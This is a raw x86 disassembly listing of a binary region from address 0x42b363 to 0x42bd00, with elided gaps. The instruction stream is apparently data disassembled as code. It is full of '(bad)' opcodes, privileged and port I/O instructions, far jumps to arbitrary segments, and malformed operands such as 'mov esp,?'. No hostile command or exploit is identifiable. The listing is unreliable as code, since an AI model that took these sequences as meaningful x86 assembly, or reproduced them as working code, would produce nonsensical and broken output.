  42b363:	jmp    0x1:0xcf67f042
  42b36a:	add    BYTE PTR [ecx],al
  42b36c:	add    BYTE PTR [eax],al
  42b36e:	aad    0xde
  42b370:	push   0xcb3a138b
  42b375:	pusha  
  42b376:	mov    ah,0xf3
  42b378:	dec    edi
  42b379:	sbb    DWORD PTR ds:[edi+0x6a],ebp
  42b37d:	lock jnp 0x42b347
  42b380:	adc    cl,al
  42b382:	loope  0x42b3ca
  42b384:	dec    ecx
  42b385:	das    
  42b386:	into   
  42b387:	dec    ebx
  42b388:	mov    ch,BYTE PTR [edx+0x18f9c350]
  42b38e:	pop    ecx
  42b38f:	aas    
  42b390:	ret    0xd938
  42b393:	(bad)  
  42b394:	jecxz  0x42b395
  42b396:	fnstsw WORD PTR [ebx+0x2881d8e4]
  42b39c:	pusha  
  42b39d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b39e:	mov    DWORD PTR [edi+ebx*4+0x297846f4],ebx
  42b3a5:	and    DWORD PTR [edi+0x4f67935b],esi
  42b3ab:	daa    
  42b3ac:	(bad)  
  42b3ad:	or     al,dh
  42b3af:	pushf  
  42b3b0:	inc    edi
  42b3b1:	hlt    
  42b3b2:	adc    BYTE PTR [eax+0x78],dl
  42b3b5:	(bad)  
  42b3b6:	mul    BYTE PTR [ebx]
  42b3b8:	sub    bl,BYTE PTR ds:0x4f9bff47
  42b3be:	push   0xffffffb3
  42b3c0:	push   ebp
  42b3c1:	jmp    0x42b3c2
  42b3c3:	shr    DWORD PTR gs:[ecx],1
  42b3c6:	(bad)  
  42b3c9:	push   ebx
  42b3ca:	into   
  42b3cb:	dec    ebp
  42b3cc:	clc    
  42b3cd:	fnstenv [edx-0x7d78fab0]
  42b3d3:	mov    ch,0x6f
  42b3d5:	jmp    0x42b447
  42b3d7:	shl    BYTE PTR [edx],1
  42b3d9:	jmp    0x17e58daa
  42b3de:	clc    
  42b3df:	fisub  DWORD PTR [esi-0x60]
  42b3e2:	mov    bh,0x75
  42b3e4:	pop    es
  42b3e5:	pop    esi
  42b3e6:	clc    
  42b3e7:	lock js 0x42b38a
  42b3ea:	stos   BYTE PTR es:[edi],al
  42b3eb:	sahf   
  42b3ec:	out    0xf0,al
  42b3ee:	(bad)  
  42b3f0:	mov    edx,0x4beaf77
  42b3f5:	fwait
  42b3f6:	cmp    DWORD PTR [esi],edi
  42b3f8:	adc    BYTE PTR ss:[ebp-0x19],al
  42b3fc:	popa   
  42b3fd:	cmp    bl,BYTE PTR [ebx+0xe]
  42b400:	mov    esp,0xbbb864dd
  42b405:	or     eax,0xe4ec1d50
  42b40a:	sar    al,cl
  42b40c:	imul   edx,ecx,0x1fba7ab6
  42b412:	pop    es
  42b413:	add    eax,0x92d99b5f
  42b418:	sub    eax,0xd925079a
  42b41d:	cmp    dh,ah
  42b41f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b420:	hlt    
  42b421:	out    dx,eax
  42b422:	icebp  
  42b423:	in     al,dx
  42b424:	push   edx
  42b425:	retf   
  42b426:	add    BYTE PTR [ebx],0x9c
  42b429:	fadd   st,st(0)
  42b42b:	das    
  42b42c:	ja     0x42b40b
  42b42e:	sub    eax,0xe2d80510
  42b433:	jns    0x42b3cd
  42b435:	fiadd  DWORD PTR [ebx-0x32]
  42b438:	nop
  42b439:	xchg   esi,eax
  42b43a:	stos   BYTE PTR es:[edi],al
  42b43b:	cmp    bh,BYTE PTR [ebx]
  42b43d:	stc    
  42b43e:	in     eax,dx
  42b43f:	dec    esi
  42b440:	adc    DWORD PTR [ebp+eax*4+0x2605bb72],edi
  42b447:	repz sub edi,DWORD PTR ds:0x543f00c2
  42b44e:	rol    bl,1
  42b450:	and    DWORD PTR [ecx+0x73],eax
  42b453:	add    eax,0xfcba74f
  42b458:	push   esp
  42b459:	mov    BYTE PTR [edx+0x14],dh
  42b45c:	fcomp  QWORD PTR [ebp-0x34]
  42b45f:	inc    edi
  42b460:	jae    0x42b4a3
  42b462:	push   edi
  42b463:	sbb    al,0x17
  42b465:	iret   
  42b466:	mov    bl,0xc6
  42b468:	daa    
  42b469:	mov    ebx,0x9a60acae
	...
  42b4d6:	mov    al,BYTE PTR [ebp+0x20]
  42b4d9:	out    dx,al
  42b4da:	out    dx,eax
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [esi+esi*8-0x2f98a0e8],esi
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	add    BYTE PTR [ecx],al
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	repnz inc ebx
  42b4f0:	cmp    ah,BYTE PTR [edx+0x71262ea0]
  42b4f6:	aad    0x4b
  42b4f8:	retf   0x1d
  42b4fb:	sbb    cl,ah
  42b4fd:	mov    ss,eax
  42b4ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b500:	adc    dh,BYTE PTR [edi]
  42b502:	or     edx,DWORD PTR [ecx+ebx*1]
  42b505:	cs add al,0x3
  42b508:	les    ecx,FWORD PTR [ecx+0x4e]
  42b50b:	adc    al,0xe0
  42b50d:	popa   
  42b50e:	ja     0x42b57f
  42b510:	mov    eax,ds:0xa2ab21a1
  42b515:	mov    ecx,0x53fe33f8
  42b51a:	es xor edi,DWORD PTR es:[ecx+0x15d69651]
  42b522:	arpl   WORD PTR [ecx+0x6d347a03],ax
  42b528:	adc    BYTE PTR [eax+eiz*8],0xa0
  42b52c:	mov    edx,0x54d01584
  42b531:	sbb    bl,al
  42b533:	mov    ebp,0x653076f4
  42b538:	jecxz  0x42b596
  42b53a:	mov    dl,0xc9
  42b53c:	xor    eax,esp
  42b53e:	add    ebp,0x34579ed
  42b544:	ds mov bl,0xf6
  42b547:	shr    DWORD PTR [edx-0x62ac483c],cl
  42b54d:	jae    0x42b550
  42b54f:	pusha  
  42b550:	xor    eax,0x74aab348
  42b555:	cmp    al,0xba
  42b557:	xor    DWORD PTR [ecx-0x4e],esi
  42b55a:	sbb    eax,0xd6c6573f
  42b55f:	or     edx,ebp
  42b561:	or     ch,bh
  42b563:	or     ebx,edi
  42b565:	adc    eax,ebp
  42b567:	cmp    edi,DWORD PTR [ebx+eiz*1-0xa276ac2]
  42b56e:	xchg   esp,eax
  42b56f:	dec    eax
  42b570:	fldpi  
  42b572:	int    0x1c
  42b574:	ret    0xefc8
  42b577:	inc    eax
  42b578:	push   esp
  42b579:	loop   0x42b5ef
  42b57b:	sbb    DWORD PTR [ebp-0xc918768],edi
  42b581:	jecxz  0x42b56d
  42b583:	loope  0x42b5d8
  42b585:	sub    BYTE PTR [edi-0x27f2064d],0xd7
  42b58c:	es pusha 
  42b58e:	xchg   esp,eax
  42b58f:	jl     0x42b569
  42b591:	scas   eax,DWORD PTR es:[edi]
  42b592:	mov    esi,0xc19db374
  42b597:	test   eax,0xf868b926
  42b59c:	into   
  42b59d:	pop    edx
  42b59e:	inc    ebx
  42b59f:	or     DWORD PTR [ecx],0xffffffdc
  42b5a2:	call   0x41ffe712
  42b5a7:	push   DWORD PTR [ebp+0x6a]
  42b5aa:	imul   edx,DWORD PTR [esi-0x6e994983],0xb5baa3b9
  42b5b4:	(bad)  
  42b5b6:	icebp  
  42b5b7:	or     BYTE PTR [edx-0x990760f],bl
  42b5bd:	adc    eax,0x2c151488
  42b5c2:	jae    0x42b54b
  42b5c4:	addr16 pop esp
  42b5c6:	sti    
  42b5c7:	cmp    BYTE PTR [edi-0xb],ah
  42b5ca:	mov    al,ds:0xf37a0ca9
  42b5cf:	popa   
  42b5d0:	mov    al,ds:0xdf5fa003
  42b5d5:	out    dx,eax
  42b5d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b5d7:	fistp  QWORD PTR [ebx]
  42b5d9:	lods   al,BYTE PTR ds:[esi]
  42b5da:	cld    
  42b5db:	jg     0x42b63c
  42b5dd:	cmp    DWORD PTR [eax],edi
  42b5df:	pop    esi
  42b5e0:	pop    ds
  42b5e1:	dec    ebx
  42b5e2:	in     al,0x29
  42b5e4:	loope  0x42b5e2
  42b5e6:	inc    ebx
  42b5e7:	xor    eax,0x288fd018
  42b5ec:	div    dl
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	bound  esi,QWORD PTR [di]
  42b665:	cdq    
  42b666:	rol    DWORD PTR [bx+di],1
  42b669:	add    BYTE PTR [eax],al
  42b66b:	add    DWORD PTR [eax],eax
  42b66d:	add    BYTE PTR [ecx],bh
  42b66f:	cmp    esp,DWORD PTR [ecx+0x52]
  42b672:	cmc    
  42b673:	(bad)  
  42b674:	leave  
  42b675:	xor    esi,DWORD PTR [edx]
  42b677:	sub    DWORD PTR [edi-0x7cb6466d],eax
  42b67d:	cmp    DWORD PTR [ecx+0xe],0x857f2247
  42b684:	jns    0x42b660
  42b686:	cmp    al,0x5f
  42b688:	push   es
  42b689:	out    0xec,al
  42b68b:	inc    eax
  42b68c:	mov    cl,0xe8
  42b68e:	mov    edx,0xf5e9f45f
  42b693:	pop    esi
  42b694:	mov    bl,0xe3
  42b696:	ds push ecx
  42b698:	addr16 dec edi
  42b69a:	ja     0x42b6a1
  42b69c:	jle    0x5e560c8f
  42b6a2:	mov    ebp,0x56ce8e95
  42b6a7:	add    bh,al
  42b6a9:	int3   
  42b6aa:	and    al,0x21
  42b6ac:	mov    al,0xc2
  42b6ae:	cmp    BYTE PTR [eax+0x9],ah
  42b6b1:	mov    bh,0xed
  42b6b3:	sbb    BYTE PTR [ebx],dl
  42b6b5:	inc    ebp
  42b6b6:	mov    edi,0xb0f06930
  42b6bb:	adc    edi,esp
  42b6bd:	sbb    dl,BYTE PTR [edi+0x75]
  42b6c0:	mov    ebp,0x5879662f
  42b6c5:	inc    esp
  42b6c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6c7:	shrd   esi,ecx,0xa9
  42b6cb:	jae    0x42b747
  42b6cd:	mov    dh,0xb7
  42b6cf:	xor    BYTE PTR [edx+edx*8+0x37b3bc67],bh
  42b6d6:	mov    ch,0x5e
  42b6d8:	add    eax,0xfb3f3046
  42b6dd:	rcl    DWORD PTR es:[ebp+0x5c],cl
  42b6e1:	sbb    eax,DWORD PTR [ebx-0x4f]
  42b6e4:	mov    bl,0x27
  42b6e6:	cwde   
  42b6e7:	dec    esi
  42b6e8:	add    al,dh
  42b6ea:	fidivr DWORD PTR [eax+ebx*8-0x25]
  42b6ee:	pop    eax
  42b6ef:	stos   BYTE PTR es:[edi],al
  42b6f0:	and    al,0xfe
  42b6f2:	cmp    ebx,esp
  42b6f4:	push   eax
  42b6f5:	and    eax,0x1c590692
  42b6fa:	inc    esi
  42b6fb:	and    eax,0x93fc4f62
  42b700:	enter  0xfa7b,0xd0
  42b704:	mov    cl,0x66
  42b706:	mov    DWORD PTR [esi-0x1a],ebp
  42b709:	pause  
  42b70b:	or     eax,0xad270627
  42b710:	(bad)  
  42b711:	dec    ebp
  42b712:	ret    0x3fe3
  42b715:	dec    ebp
  42b716:	dec    ecx
  42b717:	mov    edi,0x820e6ebe
  42b71c:	aad    0xc
  42b71e:	and    eax,0x172fa21e
  42b723:	in     eax,0x8a
  42b725:	xor    BYTE PTR [esp+edi*4-0x24],0x1c
  42b72a:	cmp    dl,BYTE PTR ds:0xfb36e94d
  42b730:	sub    ebp,ecx
  42b732:	jns    0x42b71d
  42b734:	add    cl,BYTE PTR [edx+0x66]
  42b737:	scas   al,BYTE PTR es:[edi]
  42b738:	push   cs
  42b739:	and    DWORD PTR [edx],eax
  42b73b:	jns    0x42b73e
  42b73d:	(bad)  
  42b73e:	imul   ebx,DWORD PTR [eax],0xffffffcc
  42b741:	jne    0x42b777
  42b743:	push   cs
  42b744:	stc    
  42b745:	push   ebx
  42b746:	cld    
  42b747:	aam    0xda
  42b749:	pop    ebp
  42b74a:	scas   al,BYTE PTR es:[edi]
  42b74b:	push   edi
  42b74c:	retf   
  42b74d:	int3   
  42b74e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b74f:	call   0x15318d27
  42b754:	sbb    cl,BYTE PTR [esi+0x22]
  42b757:	mov    ch,0x3c
  42b759:	stos   BYTE PTR es:[edi],al
  42b75a:	pushf  
  42b75b:	imul   ecx,esp,0xffffff93
  42b75e:	dec    edi
  42b75f:	inc    BYTE PTR [edx]
  42b761:	inc    ebx
  42b762:	icebp  
  42b763:	adc    DWORD PTR ds:0x9af4487b,esi
  42b769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b76a:	and    DWORD PTR [ecx+0xb33e],esp
	...
  42b7d4:	add    BYTE PTR [eax],al
  42b7d6:	dec    esi
  42b7d7:	inc    edx
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	js     0x42b808
  42b7e4:	jne    0x42b7d4
  42b7e6:	rol    BYTE PTR [bx+di],cl
  42b7e9:	add    BYTE PTR [eax],al
  42b7eb:	add    DWORD PTR [eax],eax
  42b7ed:	add    BYTE PTR [ebx],dl
  42b7ef:	pushf  
  42b7f0:	sbb    eax,0xf01d7b80
  42b7f5:	mov    bl,0x51
  42b7f7:	bound  ebp,QWORD PTR [ecx+ebp*2-0x1a847bc3]
  42b7fe:	mov    al,0x3d
  42b800:	adc    cl,0xee
  42b803:	retf   0x433d
  42b806:	xor    al,0x97
  42b808:	mov    ebx,0x87aa7212
  42b80d:	and    eax,0x56b911fd
  42b812:	pop    ss
  42b813:	push   0xffffffa3
  42b815:	rcl    bh,0x4f
  42b818:	jmp    0x42b877
  42b81a:	and    bl,BYTE PTR ds:0x82b16bbd
  42b820:	mov    esp,?
  42b822:	jae    0x42b814
  42b824:	xchg   esp,eax
  42b825:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b826:	mov    ah,0x4
  42b828:	mov    ebx,0x1c995b72
  42b82d:	sahf   
  42b82e:	sbb    ebx,DWORD PTR [ebx]
  42b830:	xor    al,0x35
  42b832:	dec    esp
  42b833:	or     al,0xa3
  42b835:	sbb    ebx,edx
  42b837:	sub    eax,0xf62ebbfe
  42b83c:	out    dx,al
  42b83d:	sbb    DWORD PTR [esi+0x5e],esi
  42b840:	mov    edx,0xc2caef97
  42b845:	cwde   
  42b846:	mov    esi,0x19bc72c
  42b84b:	cmp    al,0x3e
  42b84d:	fwait
  42b84e:	clc    
  42b84f:	sub    eax,0xbf4420c0
  42b854:	unpckhps xmm3,XMMWORD PTR [ebp-0x61dc9b8d]
  42b85b:	fist   DWORD PTR [esi+0x2297a455]
  42b861:	mov    al,0xee
  42b863:	stos   BYTE PTR es:[edi],al
  42b864:	sub    esp,DWORD PTR [ebx]
  42b866:	int    0x59
  42b868:	jg     0x42b89e
  42b86a:	mov    dl,0xa4
  42b86c:	je     0x42b7ef
  42b86e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b86f:	pop    esi
  42b870:	scas   al,BYTE PTR es:[edi]
  42b871:	xchg   edx,eax
  42b872:	xor    ebp,ebp
  42b874:	sar    BYTE PTR [edi],0xfc
  42b877:	scas   al,BYTE PTR es:[edi]
  42b878:	push   ds
  42b879:	push   es
  42b87a:	test   BYTE PTR [ebx+0x423d49bb],al
  42b880:	jb     0x42b88e
  42b882:	mov    dl,ah
  42b884:	push   cs
  42b885:	add    eax,esp
  42b887:	xchg   esp,eax
  42b888:	ret    
  42b889:	gs jb  0x42b8a0
  42b88c:	pop    edi
  42b88d:	cmc    
  42b88e:	les    ebx,FWORD PTR es:[ebx-0x27]
  42b892:	jne    0x42b902
  42b894:	jmp    0xb0bf4ac5
  42b899:	xchg   ebp,eax
  42b89b:	inc    edx
  42b89c:	mov    BYTE PTR [edi+0x7453a0ce],bl
  42b8a2:	fucom  st(3)
  42b8a4:	pop    eax
  42b8a5:	test   al,0x35
  42b8a7:	adc    al,0x49
  42b8a9:	in     al,dx
  42b8aa:	xchg   ecx,eax
  42b8ab:	cld    
  42b8ac:	leave  
  42b8ad:	add    ecx,DWORD PTR [ebx]
  42b8af:	jnp    0x42b8d6
  42b8b1:	inc    ecx
  42b8b2:	mov    dl,0x88
  42b8b4:	mov    dh,0x34
  42b8b6:	mov    dl,0xf7
  42b8b8:	dec    ebp
  42b8b9:	div    edi
  42b8bb:	mov    ebp,0xfab31004
  42b8c0:	sub    esp,esi
  42b8c2:	imul   ecx,DWORD PTR [ebx],0xbb5f4b60
  42b8c8:	mov    bh,0xa
  42b8ca:	sub    DWORD PTR [edi+0x3f],edx
  42b8cd:	mov    ?,WORD PTR [edx+0x44]
  42b8d0:	mov    bl,0x4
  42b8d2:	in     eax,dx
  42b8d3:	xor    ch,dl
  42b8d5:	jecxz  0x42b8a3
  42b8d7:	mov    ah,0x64
  42b8d9:	idiv   ecx
  42b8db:	push   es
  42b8dc:	rcl    BYTE PTR [ebx+0x1c07c0c4],cl
  42b8e2:	sub    eax,0x9f8375f1
  42b8e7:	(bad)  
  42b8e8:	into   
  42b8e9:	nop
  42b8ea:	sbb    al,0x98
  42b8ec:	int    0xbe
	...
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     ecx,DWORD PTR [edi]
  42b963:	adc    esi,DWORD PTR [eax]
  42b965:	jns    0x42b9ce
  42b967:	rol    DWORD PTR [ecx],cl
  42b969:	add    BYTE PTR [eax],al
  42b96b:	add    DWORD PTR [eax],eax
  42b96d:	add    BYTE PTR [edx-0x6380df9a],dl
  42b973:	add    al,0x1
  42b975:	mov    ah,0xf9
  42b977:	ja     0x42b90a
  42b979:	or     BYTE PTR [ecx+0x2d4e8c2c],dl
  42b97f:	push   cs
  42b980:	inc    esi
  42b981:	adc    al,0x98
  42b983:	aaa    
  42b984:	mov    cl,0x78
  42b986:	inc    esi
  42b987:	scas   al,BYTE PTR es:[edi]
  42b988:	xchg   BYTE PTR [edi+0x17e1c350],ah
  42b98e:	fdiv   QWORD PTR [ebx]
  42b990:	and    al,BYTE PTR [edx]
  42b992:	lods   al,BYTE PTR ds:[esi]
  42b993:	ins    DWORD PTR es:[edi],dx
  42b994:	add    eax,0xa6642637
  42b999:	push   ss
  42b99a:	(bad)
  42b99d:	add    al,0xad
  42b99f:	popf   
  42b9a0:	and    DWORD PTR [edi-0x23d2915f],esp
  42b9a6:	in     eax,0xfb
  42b9a8:	inc    esi
  42b9a9:	jge    0x42ba12
  42b9ab:	sti    
  42b9ac:	inc    edi
  42b9ad:	add    esp,DWORD PTR [esi+edx*8+0x5f05aa55]
  42b9b4:	enter  0x6766,0x7c
  42b9b8:	jne    0x42b9e3
  42b9ba:	sbb    eax,0x75be6167
  42b9bf:	xlat   BYTE PTR ds:[ebx]
  42b9c0:	ins    BYTE PTR es:[edi],dx
  42b9c1:	leave  
  42b9c2:	mov    bl,BYTE PTR [edi-0x581857d1]
  42b9c8:	data16 cmp al,0x86
  42b9cb:	mov    ds:0x697ddf3,al
  42b9d0:	int3   
  42b9d1:	cmp    DWORD PTR [eax-0x455ef5e0],0xf13d0b8c
  42b9db:	xor    eax,0xe7f92aef
  42b9e0:	stos   DWORD PTR es:[edi],eax
  42b9e1:	dec    esp
  42b9e2:	ret    
  42b9e3:	scas   eax,DWORD PTR es:[edi]
  42b9e4:	int    0x28
  42b9e6:	push   esp
  42b9e7:	mov    cl,0x88
  42b9e9:	in     eax,dx
  42b9ea:	pop    esp
  42b9eb:	jne    0x42b99e
  42b9ed:	jo     0x42ba6b
  42b9ef:	ficomp WORD PTR [edi-0x26]
  42b9f2:	jmp    0x42ba14
  42b9f4:	jae    0x42b9e7
  42b9f6:	sub    DWORD PTR [edx],eax
  42b9f8:	fist   DWORD PTR [esp+ebx*2-0x19]
  42b9fc:	sub    al,0x99
  42b9fe:	pop    ss
  42b9ff:	push   0xffffffed
  42ba01:	neg    DWORD PTR [esi]
  42ba03:	lds    edx,FWORD PTR [ecx]
  42ba05:	(bad)  [edx-0x57]
  42ba08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba09:	jl     0x42b98d
  42ba0b:	and    al,0x45
  42ba0d:	or     BYTE PTR [eax-0x52],dh
  42ba10:	add    BYTE PTR [ecx-0x27061f11],al
  42ba16:	dec    eax
  42ba17:	push   cs
  42ba18:	test   eax,0xdae8eb63
  42ba1d:	lods   eax,DWORD PTR ds:[esi]
  42ba1e:	stos   BYTE PTR es:[edi],al
  42ba1f:	mov    dl,BYTE PTR [ebx-0x3c447bf0]
  42ba25:	xchg   ebp,eax
  42ba26:	mov    edx,DWORD PTR [ebp-0x71dd2d60]
  42ba2c:	adc    DWORD PTR [ecx+0x46],ebx
  42ba2f:	jo     0x42ba76
  42ba31:	scas   eax,DWORD PTR es:[edi]
  42ba32:	pop    ss
  42ba33:	jo     0x42ba47
  42ba35:	and    edx,DWORD PTR [esp+ebx*2+0x3e380be8]
  42ba3c:	pop    ds
  42ba3d:	jmp    0xe325d9b6
  42ba42:	adc    bl,BYTE PTR [edi+edi*8]
  42ba45:	mov    esp,DWORD PTR [ebx-0x67]
  42ba48:	ret    0x8301
  42ba4b:	sti    
  42ba4c:	adc    eax,0x9480225e
  42ba51:	jo     0x42ba9f
  42ba53:	push   esp
  42ba54:	mov    al,0xfd
  42ba56:	jge    0x42ba50
  42ba58:	iret   
  42ba59:	ins    BYTE PTR es:[edi],dx
  42ba5a:	(bad)  
  42ba5b:	mov    edi,0xc543ad8
  42ba60:	lods   eax,DWORD PTR ds:[esi]
  42ba61:	out    dx,eax
  42ba62:	xor    esi,edi
  42ba64:	jp     0x42bae5
  42ba66:	test   BYTE PTR [edx+0x5c],dh
  42ba69:	pop    es
  42ba6a:	push   0xb0d6e5
	...
  42bad3:	add    BYTE PTR [eax],al
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [edi+0x59],esi
  42bae4:	jno    0x42bace
  42bae6:	addr16 aam 0x1
  42bae9:	add    BYTE PTR [eax],al
  42baeb:	add    DWORD PTR [eax],eax
  42baed:	add    BYTE PTR [edx+0xd],al
  42baf0:	aas    
  42baf1:	mov    cl,0x50
  42baf3:	dec    esp
  42baf4:	ret    0x1153
  42baf7:	xor    ch,BYTE PTR [edi-0x343af6b8]
  42bafd:	sub    al,0xc9
  42baff:	loopne 0x42bb7a
  42bb01:	jl     0x42ba8b
  42bb03:	call   0xc85e:0xc5f51c42
  42bb0a:	scas   eax,DWORD PTR es:[edi]
  42bb0b:	shl    DWORD PTR [ebx+0x621f02e9],cl
  42bb11:	sahf   
  42bb12:	mov    ecx,DWORD PTR [ebp+eiz*8-0x58]
  42bb16:	mov    BYTE PTR [edi],ch
  42bb18:	outs   dx,DWORD PTR ds:[esi]
  42bb19:	fnstsw WORD PTR [ecx]
  42bb1b:	jno    0x42bb0b
  42bb1d:	cmc    
  42bb1e:	xchg   esp,eax
  42bb1f:	sub    edi,esi
  42bb21:	popf   
  42bb22:	inc    esp
  42bb23:	push   edx
  42bb24:	mov    bl,0x60
  42bb26:	sar    ebx,0xb3
  42bb29:	mov    ecx,0x168f79a8
  42bb2e:	jns    0x42bb22
  42bb30:	cmc    
  42bb31:	push   ebp
  42bb32:	cli    
  42bb33:	sub    BYTE PTR [ebx-0x98f2ca],0x34
  42bb3a:	and    DWORD PTR [esi+esi*1],esp
  42bb3d:	dec    edi
  42bb3e:	xchg   esp,eax
  42bb3f:	jle    0x42bb2f
  42bb41:	cmp    al,BYTE PTR [edi-0x35]
  42bb44:	xor    edi,edi
  42bb46:	aad    0xef
  42bb48:	cmp    ch,BYTE PTR ds:0x33eef811
  42bb4e:	jno    0x42bb08
  42bb50:	inc    esp
  42bb51:	xlat   BYTE PTR ds:[ebx]
  42bb52:	sbb    al,0x30
  42bb54:	push   0x21f6fa25
  42bb59:	ja     0x42bb64
  42bb5b:	pop    edx
  42bb5c:	je     0x42bb45
  42bb5e:	sub    edi,DWORD PTR [ecx+0x21]
  42bb61:	(bad)  
  42bb63:	push   esi
  42bb64:	fucomip st,st(3)
  42bb66:	pop    esp
  42bb67:	(bad)  
  42bb68:	mov    dl,0x6b
  42bb6a:	and    DWORD PTR [edi],edx
  42bb6c:	call   0x796f:0x83c968aa
  42bb73:	lods   al,BYTE PTR ss:[esi]
  42bb75:	mov    ebp,0x84983ac0
  42bb7a:	mov    al,0x45
  42bb7c:	dec    ebp
  42bb7d:	or     ecx,eax
  42bb7f:	mov    DWORD PTR [ecx],esp
  42bb81:	mov    ebp,0xf957066
  42bb86:	and    al,0xb4
  42bb88:	das    
  42bb89:	sub    edi,DWORD PTR [edx+0x4b6e4416]
  42bb8f:	pop    eax
  42bb90:	mov    ecx,DWORD PTR [ecx]
  42bb92:	mov    bh,0x3d
  42bb94:	add    eax,0x94b3e2ec
  42bb99:	dec    eax
  42bb9a:	mov    ds:0x9211983e,al
  42bb9f:	imul   DWORD PTR [edx-0x10]
  42bba2:	ins    DWORD PTR es:[edi],dx
  42bba3:	inc    eax
  42bba4:	cdq    
  42bba5:	sub    DWORD PTR [esi-0x30],0xbe284b1f
  42bbac:	sub    ebx,DWORD PTR [eax]
  42bbae:	inc    ebp
  42bbaf:	mov    edi,0x270ebd19
  42bbb4:	pushf  
  42bbb5:	xlat   BYTE PTR ds:[ebx]
  42bbb6:	pop    es
  42bbb7:	inc    edx
  42bbb8:	adc    eax,0x8dd99140
  42bbbd:	adc    al,0xfa
  42bbbf:	pinsrw mm6,WORD PTR [eax-0x41d446c7],0x23
  42bbc7:	mov    eax,ds:0xd67ed128
  42bbcc:	xchg   ebp,eax
  42bbcd:	in     al,dx
  42bbce:	push   ebp
  42bbcf:	cld    
  42bbd0:	outs   dx,BYTE PTR ds:[esi]
  42bbd1:	movntps XMMWORD PTR [ecx],xmm1
  42bbd4:	mov    bl,0xb5
  42bbd6:	push   ebp
  42bbd7:	pop    edx
  42bbd8:	push   edx
  42bbd9:	add    BYTE PTR [ebx+ecx*8-0x37],ch
  42bbdd:	cli    
  42bbde:	cwde   
  42bbdf:	adc    al,0x43
  42bbe1:	sbb    ebx,DWORD PTR [eax+ebp*1]
  42bbe4:	dec    edi
  42bbe5:	(bad)  
  42bbe6:	out    dx,eax
  42bbe7:	sub    ebx,ebp
  42bbe9:	mov    dl,0x6e
  42bbeb:	outs   dx,DWORD PTR ds:[esi]
  42bbec:	add    DWORD PTR [edi+0x0],ebx
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	sar    BYTE PTR [edi+0x1e],1
  42bc65:	hlt    
  42bc66:	addr16 aad 0x1
  42bc69:	add    BYTE PTR [eax],al
  42bc6b:	add    DWORD PTR [eax],eax
  42bc6d:	add    BYTE PTR [esi],cl
  42bc6f:	test   al,0xe6
  42bc71:	pusha  
  42bc72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bc73:	icebp  
  42bc74:	mov    fs,WORD PTR [ebp-0x36ffb309]
  42bc7a:	push   ecx
  42bc7b:	jo     0x42bcfa
  42bc7d:	xchg   ebp,eax
  42bc7e:	adc    bh,dh
  42bc80:	sub    ebx,esi
  42bc82:	mov    ecx,0x3b3e0afd
  42bc87:	rol    BYTE PTR [ecx+0x170e6dfe],1
  42bc8d:	jns    0x42bcfb
  42bc8f:	test   eax,0x6592d900
  42bc94:	out    dx,al
  42bc95:	push   ecx
  42bc96:	ror    BYTE PTR [ecx],1
  42bc98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bc99:	sahf   
  42bc9a:	idiv   BYTE PTR [eax]
  42bc9c:	fcomp  QWORD PTR [edx-0x3657ba86]
  42bca2:	adc    ebx,DWORD PTR [esi+ecx*2-0x16c2a1d0]
  42bca9:	xchg   esp,eax
  42bcaa:	rol    BYTE PTR [ecx-0x552746be],cl
  42bcb0:	jmp    0x79e:0x9ad0670
  42bcb7:	add    dl,ah
  42bcb9:	out    0x94,al
  42bcbb:	pop    ss
  42bcbc:	jmp    0x42bc9d
  42bcbe:	jo     0x42bcdd
  42bcc0:	adc    DWORD PTR [ebx-0x5c],eax
  42bcc3:	out    dx,eax
  42bcc4:	iret   
  42bcc5:	mov    esi,0x56d5df19
  42bcca:	call   0xe128:0x3380d580
  42bcd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcd2:	mov    al,0xb5
  42bcd4:	pop    es
  42bcd5:	or     edi,DWORD PTR [ecx-0x7c]
  42bcd8:	loop   0x42bca9
  42bcda:	jle    0x42bc8f
  42bcdc:	cdq    
  42bcdd:	dec    eax
  42bcde:	aas    
  42bcdf:	cmp    ch,BYTE PTR ds:0x1ee2e8b
  42bce5:	xchg   ebp,eax
  42bce6:	sbb    DWORD PTR [eax],ecx
  42bce8:	ret    
  42bce9:	out    dx,al
  42bcea:	cmp    ah,al
  42bcec:	lds    ecx,FWORD PTR [edx-0x5f7d6038]
  42bcf2:	mov    esi,DWORD PTR ds:0x27e358e9
  42bcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42bcf9:	or     eax,0x65e1fca4
  42bcfe:	jecxz  0x42bd32
  42bd00:	in     al,0x62
